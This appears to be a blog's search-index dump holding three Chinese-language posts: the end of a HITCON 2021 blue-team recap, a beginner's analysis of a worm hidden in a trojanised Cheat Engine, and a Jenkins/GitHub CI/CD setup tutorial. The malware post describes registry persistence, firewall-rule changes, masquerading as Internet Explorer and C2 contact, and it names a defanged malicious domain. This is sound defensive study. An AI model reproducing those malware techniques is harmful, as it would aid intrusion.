XDR Citrix MPX-5900 vSphere ESXi PowerEdge R630 Juniper EX2300 7. Log 的正確使用 Log 感覺很吃經驗，能夠快速在 filter 下 keyword 可以省很多時間，而且 Windows 內建的 Event Viewer 很難用（賽後有聽說推薦用 code::blocks），隊友當下在看 Log 被程式執行的速度搞到很頭疼，或許剛好有駭客在裡頭產生 event log 吧 XD 再來 Windows 有些服務預設也不會紀錄 log，例如 Event ID 4688 就需要手動開啟，因此最好能根據目的決定怎麼使用 Log，盲目翻找感覺時間會不夠用…。 下圖是討論出來在正確部署 PA 前提下理想中的系統架構，感謝紅隊替我們解惑一些細節\u003e\u003c 大概就這樣吧，工具都不熟實在很難產出有用的心得，如果上述有任何錯誤歡迎幫忙指正，附上終局的結果，後面真的躺好躺滿QQ Cyris－賽後依舊狀況外ㄉ藍隊苦主 賽後交流時，大家都不知道攻擊怎麼來的，但我們跟別人差在… 我們不會開機… ","date":"2021-11-01","objectID":"/posts/2021/hitcon-education-defense-2021/:3:0","tags":["HITCON Defense","AIS3"],"title":"[Sharing] HITCON Education Defense 2021","uri":"/posts/2021/hitcon-education-defense-2021/"},{"categories":["資訊安全 Cyber Security"],"content":"寫在最後 確實以企業的角度，寧願短暫的下線進行修補，也不要冒險邊維運邊補洞。但實際上我們是… 下線後就不會上線了 QwQ 原本頒獎完就要直接解散，但我不想就這樣被打得莫名其妙回去，因此攔了幾位紅隊求幫忙，結果就是整個紅隊來幫忙解惑，有幾位還是平常就在 FB 追蹤的大神，實在很感謝各位願意留下來提點，還分享一些過程的小趣聞www 最後也感謝隊友們願意陪我北上當砲灰（M屬性確定），也感謝 AIS3 主辦單位提供的優質環境和滿滿的零食，雖然競賽那天我真的都沒食慾吃QQ 最後只帶了一杯飲料回高雄。雖然是六隊的最後一名，但起碼還是被打的很有感（？ 我校雖然過去有學生自治的CDPA（校園宿舍網路推廣協會），也有開設 “網路安全”、“駭客攻防” 等資安課程，但前者因為人力不足還給學校，後者也都不是系上教授，因此修課難度沒有很高，最近又看到北部三校（台大\u0026台科大\u0026交大）合開的程式安全，聽朋友描述作業其難度相當高，而且慣例的期末考 EOF CTF，我前年參加幾乎寫不出幾題…，只能說南北在資安這塊的資源還是有差，但可以的話我也不想嘴巴講講想變強，因此這趟藍隊攻防真的是給我相當大的動力，雖然很想立刻寫點什麼 side project，但無奈時間不夠用QQ ","date":"2021-11-01","objectID":"/posts/2021/hitcon-education-defense-2021/:4:0","tags":["HITCON Defense","AIS3"],"title":"[Sharing] HITCON Education Defense 2021","uri":"/posts/2021/hitcon-education-defense-2021/"},{"categories":["資訊安全 Cyber Security"],"content":"第一次撿到野生的 Malware。 先講結論！由於時間有限以及本人的技術不到位，最後並沒有很理想的結果。 希望之後在 Malware Analysis 這塊技能樹點起來再回來分析會有所成長 QQ ","date":"2021-07-21","objectID":"/posts/2021/my-first-malware-study/:0:0","tags":["Malware Analysis","Worm"],"title":"[Malware Analysis] 出現了！是野生的貓味","uri":"/posts/2021/my-first-malware-study/"},{"categories":["資訊安全 Cyber Security"],"content":"Story Time 前回提要 我校為了提升校園網路環境安全，在今年初針對外對內的 RDP、FTP、SSH、MS-SQL、TELNET 藉由 IPS 通通擋掉。而我們 Lab 主要運作的伺服器由於有連線的需求而向學校申請 IP 連線許可，在疫情被迫 Work From Home 的非常時期顯得相當重要。 而最近，我們 Lab 收到了校方的資安通報，而目標 IP 正是主要運作的伺服器，據說是中了蠕蟲。 雖然我認為做為資安相關研究應該要收個資安通報解解成就，但是這次實在是莫名的讓人措手不及，這幾天分別由 @stavhaygn 和 @hanhan3927 學長兩位網管(?)負責調查，從假日看到他們螢幕上滿滿的 log，真的很辛苦呢。 而在今天 @stavhaygn 在群組丟了兩隻 Malware 問我有沒有興趣分析，起初我只是抱著難得有機會加減摸一下（順便把生灰塵的 Parallel Desktop 拿出來清），結果拿去餵 VirtualTotal 發現是一種蠕蟲，很自然地就想到前陣子的資安通報。 很明顯事情並沒有照著劇本走，因為 Lab 主要運作的伺服器是 Linux，而撿到兩隻的 Malware 都是 .exe 完全不能執行（用紅酒除外），第一時間還很不識相的在群組出聲，哭啊被嘲諷 QwQ 故事大概就這樣， 下面會分享第一次分析 Malware 我做了哪些事，以及用到哪些工具（即便我都不熟==）。 ","date":"2021-07-21","objectID":"/posts/2021/my-first-malware-study/:1:0","tags":["Malware Analysis","Worm"],"title":"[Malware Analysis] 出現了！是野生的貓味","uri":"/posts/2021/my-first-malware-study/"},{"categories":["資訊安全 Cyber Security"],"content":"Simple Analysis ","date":"2021-07-21","objectID":"/posts/2021/my-first-malware-study/:2:0","tags":["Malware Analysis","Worm"],"title":"[Malware Analysis] 出現了！是野生的貓味","uri":"/posts/2021/my-first-malware-study/"},{"categories":["資訊安全 Cyber Security"],"content":"PeStudio 附上兩隻 Malware 在 VirusTotal 的結果，這裡使用 PeStudio 做為分析 .exe 的起手式，可以看到兩者皆為 32-bits 以及右圖 Malware 有加殼(UPX) 等等檔案資訊。 從之後的研究可知兩者為前後關係，分別是由左圖的 malware-A 執行後產生副產物 malware-B。 VirusTotal 的結果分別為 malware-A (60/69)、malware-B (62/68)，而 malware-A 被大部分防毒軟體判讀出來的 Ramnit 是當前臺灣企業受駭最多的一種惡意攻擊手法（iThome 新聞），網路上也不難找到相關的分析報告，接下來我想了解的就是這組 Malware 到底做了什麼。 ","date":"2021-07-21","objectID":"/posts/2021/my-first-malware-study/:2:1","tags":["Malware Analysis","Worm"],"title":"[Malware Analysis] 出現了！是野生的貓味","uri":"/posts/2021/my-first-malware-study/"},{"categories":["資訊安全 Cyber Security"],"content":"IDA Pro 第一步，當然就是拿出逆向工程萬用寶具 IDA Pro 使用 F5 大法！ 大概追了一小段時間… 嗯 看不懂呢QQ 該說組語的底子不夠嗎，雖然說很多 know-how / domain knowledge 需要 google （但我覺得就是自己沒耐心），本來還想用 x64dbg 下中斷點追一下細節，不過看起來是沒戲嗚嗚。 老實說，第一次這麼沒頭沒尾的就拿了檔案要分析，還真的不知道該做什麼w CTF 好歹都有給情境或是至少不會毫無方向，所以就上網找了一下這類 Malware 分析的操作。 ","date":"2021-07-21","objectID":"/posts/2021/my-first-malware-study/:2:2","tags":["Malware Analysis","Worm"],"title":"[Malware Analysis] 出現了！是野生的貓味","uri":"/posts/2021/my-first-malware-study/"},{"categories":["資訊安全 Cyber Security"],"content":"Regshot 首先是 Regshot，考慮到惡意程式通常會修改 registry，因此找到這個可以 snapshot 並且進行比較的開源程式。原本我的 sandbox 環境是在 Windows10 進行實驗，但是當我把比較的結果分享給 @stavhaygn 時，被提議使用 Windows7，一測下去 registry 的修改數量增加許多，原來目標主機的環境是 Windows7 早說嘛（雖然我自己也擅自預設環境為Win10）。 要說有什麼發現嗎？ 很多註冊表的關鍵字要大概都一知半解，但可以注意到新增大量 ShellBags 的 key 和 value 企圖將 Malware 自己藏起來，話說連 {5C4F28B5-F869-4E84-8E60-F11DB97C5CC7} 這串 ID 都有東西可以查 XD，還有 FirewallPolicy 看起來都有被動到，最後 MuiCache 可以自定義 .exe 名稱顯示，這裡 Malware 看起來是偽裝成 Internet Explorer。 Regshot 1.9.0 x64 Unicode Comments: Datetime: - Computer: - Username: - ---------------------------------- Keys added: 4 ---------------------------------- HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\Compatibility Assistant\\Monitored HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\Compatibility Assistant\\Quarantined HKU\\S-1-5-21-2683313141-1501627848-3399458464-1000\\Software\\Cheat Engine HKU\\S-1-5-21-2683313141-1501627848-3399458464-1000\\Software\\Cheat Engine\\Window Positions 96 ---------------------------------- Values added: 14 ---------------------------------- HKLM\\SYSTEM\\ControlSet001\\services\\SharedAccess\\Parameters\\FirewallPolicy\\FirewallRules\\TCP Query User{B722FD22-77FB-4A93-B73C-35A5003B8208}C:\\program files (x86)\\internet explorer\\iexplore.exe: \"v2.10|Action=Allow|Active=TRUE|Dir=In|Protocol=6|Profile=Public|App=C:\\program files (x86)\\internet explorer\\iexplore.exe|Name=Internet Explorer|Desc=Internet Explorer|Defer=User|\" HKLM\\SYSTEM\\ControlSet001\\services\\SharedAccess\\Parameters\\FirewallPolicy\\FirewallRules\\UDP Query User{90FF74F6-3F69-4CB0-A8C9-B3478A25FFF5}C:\\program files (x86)\\internet explorer\\iexplore.exe: \"v2.10|Action=Allow|Active=TRUE|Dir=In|Protocol=17|Profile=Public|App=C:\\program files (x86)\\internet explorer\\iexplore.exe|Name=Internet Explorer|Desc=Internet Explorer|Defer=User|\" HKLM\\SYSTEM\\CurrentControlSet\\services\\SharedAccess\\Parameters\\FirewallPolicy\\FirewallRules\\TCP Query User{B722FD22-77FB-4A93-B73C-35A5003B8208}C:\\program files (x86)\\internet explorer\\iexplore.exe: \"v2.10|Action=Allow|Active=TRUE|Dir=In|Protocol=6|Profile=Public|App=C:\\program files (x86)\\internet explorer\\iexplore.exe|Name=Internet Explorer|Desc=Internet Explorer|Defer=User|\" HKLM\\SYSTEM\\CurrentControlSet\\services\\SharedAccess\\Parameters\\FirewallPolicy\\FirewallRules\\UDP Query User{90FF74F6-3F69-4CB0-A8C9-B3478A25FFF5}C:\\program files (x86)\\internet explorer\\iexplore.exe: \"v2.10|Action=Allow|Active=TRUE|Dir=In|Protocol=17|Profile=Public|App=C:\\program files (x86)\\internet explorer\\iexplore.exe|Name=Internet Explorer|Desc=Internet Explorer|Defer=User|\" HKU\\S-1-5-21-2683313141-1501627848-3399458464-1000\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\StartPage\\StartMenu_Balloon_Time: C0 E1 E5 57 14 7E D7 01 HKU\\S-1-5-21-2683313141-1501627848-3399458464-1000\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\UserAssist\\{CEBFF5CD-ACE2-4F4F-9178-9926F41749EA}\\Count\\P:\\Hfref\\lpgfrat\\Qbjaybnqf\\0720 znyjner\\znyjner\\123.RKR: 00 00 00 00 01 00 00 00 00 00 00 00 00 00 00 00 00 00 80 BF 00 00 80 BF 00 00 80 BF 00 00 80 BF 00 00 80 BF 00 00 80 BF 00 00 80 BF 00 00 80 BF 00 00 80 BF 00 00 80 BF FF FF FF FF 10 BD 00 D6 13 7E D7 01 00 00 00 00 HKU\\S-1-5-21-2683313141-1501627848-3399458464-1000\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\UserAssist\\{CEBFF5CD-ACE2-4F4F-9178-9926F41749EA}\\Count\\P:\\Hfref\\lpgfrat\\NccQngn\\Ybpny\\Grzc\\prgenvaref\\PRG7P55.gzc\\rkgenpgrq\\123.RKR: 00 00 00 00 00 00 00 00 03 00 00 00 2A F2 00 00 00 00 80 BF 00 00 80 BF 00 00 80 BF 00 00 80 BF 00 00 80 BF 00 00 80 BF 00 00 80 BF 00 00 80 BF 00 00 80 BF 00 00 80 BF FF FF FF FF 00 00 00 00 00 00 00 00 00 00 00 00 HKU\\S-1-5-21-2683313141-1501627848-3399458464-1000\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\UserAssist\\{CEBFF5CD-ACE2-4F4F-9178-9926F41749EA}\\Count\\{1NP14R77-02R7-4R5Q-O744-2RO1NR5198O7}\\abgrcnq.rkr: 00 00 00 00 00 00 00 00 03 00 00 00 79 7D 01 00 00 00 80 BF 00 00 80 BF 00 00 80 BF 00 00 80 BF 00 00 80 BF 00 00 80 BF 00 00 80 BF 00 00 80 BF 00 00 80 BF 00 00 80 BF FF","date":"2021-07-21","objectID":"/posts/2021/my-first-malware-study/:2:3","tags":["Malware Analysis","Worm"],"title":"[Malware Analysis] 出現了！是野生的貓味","uri":"/posts/2021/my-first-malware-study/"},{"categories":["資訊安全 Cyber Security"],"content":"Process Hacker Process Hacker 簡單講就是工作管理員的進階版(Ｏ)，平常沒碰 Windows 的我也是問了才知道有這軟體可以進一步觀察 process 在後台執行的狀況。 將 Malware RUN 起來，出現模仿相當完美的 IE，只是出現位置不對（笑） 原本在斷網的 Sandbox 等不到 Malware 發 request，所以只好手機開分享看看他會怎麼運作，抓到程式連到 Amazon EC2 的行為（經驗判斷應該是連 C2 Server，是常見的 Botnet 手法）。 順便宣導一下 !!!不要走學校網路，除非想收資安通報!!! 不過後續不清楚 Malware 怎麼運作，就只是反覆一直連線，看到 Network 那一坨 domain 又不清掉實在讓人略不爽（？） 最後，發現在 kill 掉 Malware 後過沒多久會自己重啟（怕.jpg） ","date":"2021-07-21","objectID":"/posts/2021/my-first-malware-study/:2:4","tags":["Malware Analysis","Worm"],"title":"[Malware Analysis] 出現了！是野生的貓味","uri":"/posts/2021/my-first-malware-study/"},{"categories":["資訊安全 Cyber Security"],"content":"Wireshark Wireshark 是用來分析網路封包的工具。 原本在斷網環境錄製封包一直沒有看到預期的 request，猜想 Malware 是否有判斷網路環境，所以我用手機開網路分享（但不對外開行動網路），發現在 DNS 開始會有 google.com、yahoo.com、bing.com 的詢問，但還有一個 supnewdmn[.]com 的 DNS 詢問，從 VirusTotal 的回報比例有 12/87，沒意外是惡意網域，之後會有一些看起來是 DGA 產生的 random domain name應該就是用來連上 Amazon EC2，也就是方才提到的 C2 Server。 直接對外連網後，DNS 查詢的 domain 就會限縮到 google.com 和 supnewdmn[.]com，以及 random domain name。從 Process Hacker 得知的連線 Port 447 來看，由於封包都是走 TCP，所以從 Wireshark 看不到什麼內容 QQ ","date":"2021-07-21","objectID":"/posts/2021/my-first-malware-study/:2:5","tags":["Malware Analysis","Worm"],"title":"[Malware Analysis] 出現了！是野生的貓味","uri":"/posts/2021/my-first-malware-study/"},{"categories":["資訊安全 Cyber Security"],"content":"In the End 從分析 Malware 的時候不難看出該程式的原型是 cheat engine，只是被加料了 (下圖借用 CAPE Sandbox Screenshot)。 而故事的後續，原來是 @stavhaygn 友人透過 VPN 走校園網路，結果下載的私服外掛被埋了蠕蟲，因此校方 IPS 在分析惡意流量追溯 IP 才會追到我們 Lab 的伺服器，這件事告訴我們 慎選朋友 使用學校網路請不要壞壞。 最後，簡單畫個這次分析的示意圖吧，只是 Malware 到底從 C2 server 那邊拿了什麼做了什麼，就不知道了 QwQ 但我想下一步從 reverse 著手應該會有進一步地發現。 ","date":"2021-07-21","objectID":"/posts/2021/my-first-malware-study/:3:0","tags":["Malware Analysis","Worm"],"title":"[Malware Analysis] 出現了！是野生的貓味","uri":"/posts/2021/my-first-malware-study/"},{"categories":["程式設計 Programming"],"content":" Nice question. ","date":"2021-06-19","objectID":"/posts/2021/cicd-jenkins-with-github-note/:0:0","tags":["DevOps","Jenkins CI/CD"],"title":"[Sharing] Jenkins 🛠 Github 當服務生遇到章魚貓","uri":"/posts/2021/cicd-jenkins-with-github-note/"},{"categories":["程式設計 Programming"],"content":"一些 murmur 這學期修了一門「雲端大數據基礎建設實務」，真的是完全不在畢業學分的規劃內。 課名不重要，亮點是學校和台GG合開的新課程（資工/資管限修），所以內容以台GG合作的大廠輪流分享技術為主，包含 Cisco、Aruba、VMware、Red Hat、Splunk、Oracle 和 SAS，還記得第一堂旁聽的人多到爆炸，我們 Lab 也有不少人修。 期中期末的分組報告主題為「如何以最低建置與營運成本建置一個高穩定，高效率的雲端服務」，原本應該是只要腦補一個系統報告就好，不過在討論題目的時候 @stavhaygn 一句「蛤 我比較想要可以實作的」，注定這條路勢必不好走（笑） Note 💡 專案有放在 MacacaHub Github，名稱呼應當時「大排長榮」事件時事取名為「EVERCTF」，不知道之後還有沒有時間繼續開發就是了QQ 結果就是，小組拆成書報組和實作組，分別由我和 @stavhaygn 帶頭，題目為「以基礎架構即程式碼原則實作高穩定之自動化部署 CTF 競賽平台」。在這個半數成員都在趕碩論的組合，我一開始就不指望實作可以完成，只能走多少算多少XD 現在，由於實作組的夥伴正在碩論超絕趕進度中，而我對專案中 DevOps 的環節蠻有興趣，所以在準備期末報告之餘也摸 Jenkins 這塊。什麼，你問我的碩論呢？傷心事就別提了。 總之，以下為透過 Github 和 Jenkins Pipeline 進行 CI/CD 的一些筆記。研究時間有限若有用字上的任何 Bug 都歡迎各位來信指正!!! ","date":"2021-06-19","objectID":"/posts/2021/cicd-jenkins-with-github-note/:1:0","tags":["DevOps","Jenkins CI/CD"],"title":"[Sharing] Jenkins 🛠 Github 當服務生遇到章魚貓","uri":"/posts/2021/cicd-jenkins-with-github-note/"},{"categories":["程式設計 Programming"],"content":"Introduction 「CI/CD」中文譯作「持續性整合 / 持續部署or交付」， 其原文為 (Continuous Integration / Continuous Deployment 或是 Continuous Delivery) ，個人認為這種把程式從建構、測試、部署，開發流程全部自動化的技術真是資訊圈的重要突破，雖然繁複的事做久了大家會想寫成 script，但對於整套都自動化做起來又是另一回事 XD Jenkins 是基於 Java 在 CI/CD 這個領域中老牌的服務，網路上的介紹文數不勝數，尤其 iThome 鐵人賽有不少優文，我想這裡就不花時間介紹了，另外這篇主要是針對 EVERCTF 系統設計上 CI/CD 的筆記，因此在其他的工具使用上不會有太多著墨 (不然扯到 Git、Docker 等等的不知道要花幾篇介紹XDDDDD)。 ","date":"2021-06-19","objectID":"/posts/2021/cicd-jenkins-with-github-note/:2:0","tags":["DevOps","Jenkins CI/CD"],"title":"[Sharing] Jenkins 🛠 Github 當服務生遇到章魚貓","uri":"/posts/2021/cicd-jenkins-with-github-note/"},{"categories":["程式設計 Programming"],"content":"System overview 簡單說明一下 EVERCTF 在 CI/CD 這塊的運作吧 : 3 下圖是我們規劃的 Jenkins Pipeline，流程上由出題者主動推到 Github (Push/PR)，然後觸發 Jenkins 進行檢查後將 Docker image 推到 Docker registry，最後透過 K8s 進行測試及部署。 下面是預期中的資料結構，不過畢竟根據題目的需求還有很多改善空間。 . (workspace) +- jenkinsfile +- challenges +- pwn +- pwn1 +- config.yaml +- Dockerfile +- exploit.py +- blahblahblah... +- pwn2 +-web +- web1 +- config.yaml +- Dockerfile +- html +- index.html +- blahblahblah... +- exploit +- Dockerfile +- exploit.py +- web2 ","date":"2021-06-19","objectID":"/posts/2021/cicd-jenkins-with-github-note/:2:1","tags":["DevOps","Jenkins CI/CD"],"title":"[Sharing] Jenkins 🛠 Github 當服務生遇到章魚貓","uri":"/posts/2021/cicd-jenkins-with-github-note/"},{"categories":["程式設計 Programming"],"content":"Configure 由於我平常只摸過小工具(?)，對於這種需要設定/認證的工具真的是很不上手，花了很多時間看 tutorial。 ","date":"2021-06-19","objectID":"/posts/2021/cicd-jenkins-with-github-note/:3:0","tags":["DevOps","Jenkins CI/CD"],"title":"[Sharing] Jenkins 🛠 Github 當服務生遇到章魚貓","uri":"/posts/2021/cicd-jenkins-with-github-note/"},{"categories":["程式設計 Programming"],"content":"Environment Note 該篇文章的測試環境分別在 Ubuntu 18.04 和 MacOS 10.15（Jenkins 版本為 jenkinsci/blueocean :1.24.7） Jenkins 的 Docker 安裝如下！ $ docker run \\ --name jenkins-blueocean \\ -d \\ -u root \\ -p 9000:8080 \\ -v jenkins-data:/var/jenkins_home \\ -v /var/run/docker.sock:/var/run/docker.sock \\ jenkinsci/blueocean 簡單說明 parameter 用途 line 2: 自訂 images name line 3: 背景執行 container line 4: 以 root 身份登入 line 5: 將 container 端的 Port 8080 對應到 host 端的 9000 line 6: 將 host 端的 jenkins-data(volume) 掛載到 container 端的 /var/jenkins_home line 7: 讓 Jenkins 可以操作 host 端的其他 container，避免 docker in docker 現象 line 8: Docker image from DockerHub jenkinsci/blueocean 關於 line 8 所使用的 image，雖然 Jenkins 官方有另一個 jenkinsci/jenkins 比較像正版的 image (?)，不過從 User Handbook 來看官方比較推 jenkinsci/blueocean，該版本加入了 Blue Ocean 的使用介面，簡單講就是官方 UI 太醜 太傳統，所以加入了新的 UI（笑）。 若成功執行上述的 docker run，可以從 docker ps -a 確認到正在運行的 Container。 從 127.0.0.1:9000 會發現需要 Unlock Jenkins，用下方指令直接從 Jenkins Container 內抓 password。 $ docker exec -it jenkins-blueocean cat /var/jenkins_home/secrets/initialAdminPassword 選左邊的安裝套件，裡面也包含之後會用到的 Github plugin，將剩下的設定點一點就算是完成了！ ","date":"2021-06-19","objectID":"/posts/2021/cicd-jenkins-with-github-note/:3:1","tags":["DevOps","Jenkins CI/CD"],"title":"[Sharing] Jenkins 🛠 Github 當服務生遇到章魚貓","uri":"/posts/2021/cicd-jenkins-with-github-note/"},{"categories":["程式設計 Programming"],"content":"Github Webhook 這部分可參考這篇 透過 GitHub Webhook 讓你 push code 到 Github 就會自動觸發本地 Jenkins Pipeline 為了要讓 Github 能夠主動觸發 Jenkins 進行 CI/CD，需要讓 Jenkins 有個對外的 Domain/IP，若沒有實體 IP 可以使用 ngrok 來產生 Domain，要注意 Port 是剛剛 Docekr run 設定的 9000，反之如果有實體 IP 就可以跳過 ngrok。 $ ./ngrok http 9000 在欲進行的 repo \u003e Settings \u003e Webhooks \u003e Add webhook，找到下圖畫面。 新增完 Webhook 如果點進去拉到最底下的 “Recent Deliveries” 有成功出現綠勾勾就是設定完成，要注意若把 ngrok 關閉，下次透過 Github 使用 Jenkins 就必須重新設定 Webhook (所以我都直接綁實驗室的固網 IP)。 除了 Webhook 以外，再來就是認證的部分。 也因為我們的專題是建立在 Private Repository 進行，而認證的方法很多種，這部分可參考這篇 Jenkins - Build a Private GitHub Repo ，非常之詳細。 在公私鑰產生的部分個人是用 ed25519，產生的 KEY 相對短很多，至於下指令 ssh-keygen 地方還未確定，個人是在 Jenkins Docker 中進行，但重點只是要產生公私鑰而已，頂多就是會多出 /.ssh/ 的目錄(?)。 $ docker ps -a $ docker exec -it jenkins-blueocean bash bash# ssh-keygen -t ed25519 -C \u003ce-mail\u003e Generating public/private ed25519 key pair. Enter file in which to save the key (/root/.ssh/id_ed25519): #直接Enter Enter passphrase (empty for no passphrase): #直接Enter Enter same passphrase again: #直接Enter bash# cat /root/.ssh/id_ed25519.pub ssh-ed25519 blahblahblahblahblahblahblahblahblahblahblahblahblah bash# cat /root/.ssh/id_ed25519 -----BEGIN OPENSSH PRIVATE KEY----- blahblahblahblahblahblahblahblahblahblahblahblah blahblahblahblahblahblahblahblahblahblahblahblah blahblahblahblahblahblahblahblahblahblahblahblah blahblahblahblahblahblahblahblahblahblahblahblah blahblahblahblahblahblahblahblahblahblahblahblah -----END OPENSSH PRIVATE KEY----- Github 端填 public key（左圖），Jenkins 端填 private key（右圖）。 Warning 上述情境都是在 Private Repository 且自推(Push)的情境，若今次是團隊合作共用 Private Repository 且採 pull request (PR) 的狀況，那 credential 就要從該 repo 擁有者的帳號 “Settings \u003e Developer settings \u003e Personal access tokens” 設定。 ","date":"2021-06-19","objectID":"/posts/2021/cicd-jenkins-with-github-note/:3:2","tags":["DevOps","Jenkins CI/CD"],"title":"[Sharing] Jenkins 🛠 Github 當服務生遇到章魚貓","uri":"/posts/2021/cicd-jenkins-with-github-note/"},{"categories":["程式設計 Programming"],"content":"Jenkins Theme (optional) 這部分可參考 jenkins-material-theme，就只是換個順眼的主題。 ","date":"2021-06-19","objectID":"/posts/2021/cicd-jenkins-with-github-note/:3:3","tags":["DevOps","Jenkins CI/CD"],"title":"[Sharing] Jenkins 🛠 Github 當服務生遇到章魚貓","uri":"/posts/2021/cicd-jenkins-with-github-note/"},{"categories":["程式設計 Programming"],"content":"Jenkins Language (optional) 透過 Browser 打開 Jenkins 很意外的是中文介面，查了一下發現是跟著 Browser 的語言設定，但可惜是半殘的中文化，俗稱晶晶體(?)，這種中英交雜的情況要對照網路上的教學文非常痛苦，所以稍微查了一下更改語言的方式。 Dashboard \u003e (左側)管理 Jenkins \u003e 管理外掛程式 \u003e (可用的) 搜尋 locale 進行安裝。 重啟 Jenkins 後， Dashboard \u003e (左側)管理 Jenkins \u003e 設定系統 \u003e 直接找到 Locale 的預設語言，填 ENGLISH 或 us 都可，並且勾選下方的選項「Ignore browser preference and force this language to all users」。 ","date":"2021-06-19","objectID":"/posts/2021/cicd-jenkins-with-github-note/:3:4","tags":["DevOps","Jenkins CI/CD"],"title":"[Sharing] Jenkins 🛠 Github 當服務生遇到章魚貓","uri":"/posts/2021/cicd-jenkins-with-github-note/"},{"categories":["程式設計 Programming"],"content":"Jenkins Freestyle Project 🏆GOAL 透過 push 到 Github private repository，觸發 Jenkins 編譯 cpp 並執行。 先來個簡單的小專案，從 “New Item \u003e Freestyle project” 進入專案設定。 在 Source Code Management(SCM) 部分選 “Git”，並注意 “Repository URL” 的部分因為是 Private Repository 要貼 SSH 格式。貼完之後系統會立即存取測試（即出現 ERROR），這時只要下方 “Credentials” 選擇我們稍早設定的 credential 即可。 另外要注意的是圖中箭頭所指的 “Branch Specifier”（預設是 */master），由於 2020 年黑人平權的議題 Github 將以 main 取代 master 做為預設 branch，詳細可參考這篇 iThome新聞。 在 Build Triggers 部分要勾選的是 “GitHub hook trigger for GITScm polling”，表示在接收到 Github Push 後會觸發 Jenkins。附上 Github plugin 的說明 “If Jenkins will receive PUSH GitHub hook from repo defined in Git SCM section it will trigger Git SCM polling logic. So polling logic in fact belongs to Git SCM.” 最後，我們在 Build 部分選 Execute shell 嘗試讓 Jenkins 幫我們編譯 .cpp 並執行，Command 參考如下。 echo \"Oh, It works!!!\" ls -a cd $WORKSPACE/job-sample g++ -std=c++17 main.cpp -o main.out ./main.out 試著在本機端上傳 job-sample/main.cpp 看看 Jenkins 會不會動吧！ 沒意外的話會在左側欄的 Build History 出現紀錄，然後… 失敗 w 查看 Jenkins Build 的方法有兩種，一是使用當前的原生 GUI 左側 Build History，二是使用我們在 Docker Run 使用 jenkinsci/blueocean 所提供 Blue Ocean GUI，看起來是有稍微好看一點 XD 總之為什麼會失敗呢？ 從 error logs 可以發現是 g++: not found，也就是專案所需的套件是要在 Jenkins 安裝（由於 jenkinsci/blueocean 是基於 Apache Maven，因此安裝指令為 apk）。 $ docker ps -a $ docker exec -it jenkins-blueocean bash bash-5.1# apk add g++ bash-5.1# g++ -v 安裝完 g++ 就回到 Jenkins 透過 “Build Now”（原生GUI）或 “Run”（Blue Ocean GUI）重新執行看看，成功！（下圖為 Blue Ocean GUI） ","date":"2021-06-19","objectID":"/posts/2021/cicd-jenkins-with-github-note/:4:0","tags":["DevOps","Jenkins CI/CD"],"title":"[Sharing] Jenkins 🛠 Github 當服務生遇到章魚貓","uri":"/posts/2021/cicd-jenkins-with-github-note/"},{"categories":["程式設計 Programming"],"content":"Jenkins Pipeline 從上面 Freestyle project 的範例比較適合單一工作的小專案，對於我們的專題可能不敷使用，因此接下來要介紹的是透過 Jenkinsfile 執行的 Jenkins pipeline !! 🏆GOAL 透過 push 到 Github private repository，觸發 Jenkins pipeline 建立 Docker image 後 push image 到 Harbor registry。 首先，專題需求要安裝 Docker Pipeline Plugins。 再來，同樣從 “New Item \u003e Freestyle project” 進入專案設定，要注意的點大致相同。 Build Triggers 選擇 “GitHub hook trigger for GITScm polling” Pipeline 的部分: 選擇 Pipeline script from SCM \u003e Git 貼上 SSH 格式的 Repository URL Branch 注意是 */main Script Path 在專案根目錄，預設為 Jenkinsfile 再來我們需要可以上傳的 Docker registry，大部分想到的應該都是 DockerHub，不過考慮到我們的題目都必須在 private registry，所以這邊使用 Harbor registry 比較符合我們的需求，設定上可參考這篇iThome文章。 Note 在實驗的過程發現在執行 Harbor 沒辦法只走 HTTP，所以又花了點時間學習怎麼用 Let’s Encrypt 自簽憑證走 HTTPS，認真覺得自己在網頁開發方面真的很新手XD 確認將 Harbor 成功 run 起來後，下一步就是要設定 Jenkins 的 Credentials，讓 Jenkins 能夠把 Docker image 推到 Harbor。新增 credentials 的部分和設定 webhook 一樣，這次我們透過 “Username with password”，而非 SSH，注意 ID 欄位就是之後放在 Jenkinsfile 做為環境變數，讓觸發 Jenkins 時才能順便 push image 到 Harbor。 最後就是重頭戲 Jenkinsfile 了！ 說實在這部分個人覺得不是很好寫，何況 Jenkins pipeline 還分成兩種語法，分別是 Scripted pipeline 和 Declarative pipeline，沒有統一的寫法根本就是奇美拉QQ 對第一次接觸的我來說光是要找範例code就花費不少時間，關於語法的細節可以參考這篇 精通 Jenkins Pipeline — part1 (Groovy 以及 Jenkinsfile)，整個系列我認為寫得相當完整。 這裡的 Sample code 為simple-flask，簡單生出一個網頁，並且透過測試檢查網頁內容是否正確。 測試失敗的案例如下，多了 Meow~ (喵喵喵) 測試成功的話最終就能把 Docker image 推去 Harbor 了~ 注意 push 的位置為 \u003c harbor domain \u003e/\u003c harbor projects\u003e，至於 Docker image 可以直接寫 \u003c image name \u003e/\u003c your name \u003e，不會被視為新目錄（會拿出來講是因為我以為會這樣XD）。 最後就附個 Jenkinsfile ，應該是不太需要註解… 吧 pipeline { environment { // setting in Jenkins credential REGISTRY_CREDENTIAL = \"harbor-credential\" } /* I'm not sure about the variable scoping rules in the Groovy language, so I write in setup stage as coded below. parameters { string (name: 'DOCKER_REG', defaultValue: \"registry.eevee.tw/lab\", description: 'Docker registry') string (name: 'IMAGE_NAME', defaultValue: \"app/yctseng\", description: 'Docker image name') } */ agent any stages { stage(\"Setup\") { steps { sh \"docker version\" script { DOCKER_REG = \"registry.eevee.tw/lab\" IMAGE_NAME = \"app/yctseng\" } } } stage(\"Build Docker Image\") { steps { dir(\"simple-flask\") { script { ImageName = \"${DOCKER_REG}/${IMAGE_NAME}\" DockerImage = docker.build(ImageName) } } } } stage(\"Test Docker Image\") { steps { sh \"docker run --rm ${DOCKER_REG}/${IMAGE_NAME} flask test\" } } stage(\"Push Docker Image\") { steps { script { docker.withRegistry(\"https://${DOCKER_REG}\", REGISTRY_CREDENTIAL) { DockerImage.push(\"latest\") } } echo \"Remove unused images\" sh \"docker rmi ${DOCKER_REG}/${IMAGE_NAME}\" } } } } 我負責的範圍大概就到這裡，剩下就是由 @stavhaygn 接手透過 Kubernetes(K8s) 做 